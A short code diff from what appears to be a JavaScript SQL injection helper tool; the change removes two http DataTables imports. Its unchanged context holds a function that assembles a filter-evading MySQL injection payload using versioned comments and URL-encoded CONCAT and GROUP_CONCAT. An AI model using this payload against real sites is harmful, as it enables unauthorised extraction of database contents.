@@ -64,11 +64,9 @@ $(document).ready(function () {
     function PayloadConcat(string) {
         return `/*!50000%43o%4Ec%41t/**12345**/(${stringtohex('<inject>')},unhex(hex(/*!50000Gr%6fuP_c%6fnCAT(${string}))),${stringtohex("</inject> <!--")})*/`
     }
-
-    importcss("http://cdn.datatables.net/1.10.23/css/jquery.dataTables.min.css")
+    
     importcss("https://unpkg.com/tailwindcss@2.0.2/dist/tailwind.min.css")
     importjs("https://cdnjs.cloudflare.com/ajax/libs/moment.js/2.29.1/moment.min.js")
-    importjs("http://cdn.datatables.net/1.10.23/js/jquery.dataTables.min.js")
 
     async function setUrl() {
         const {
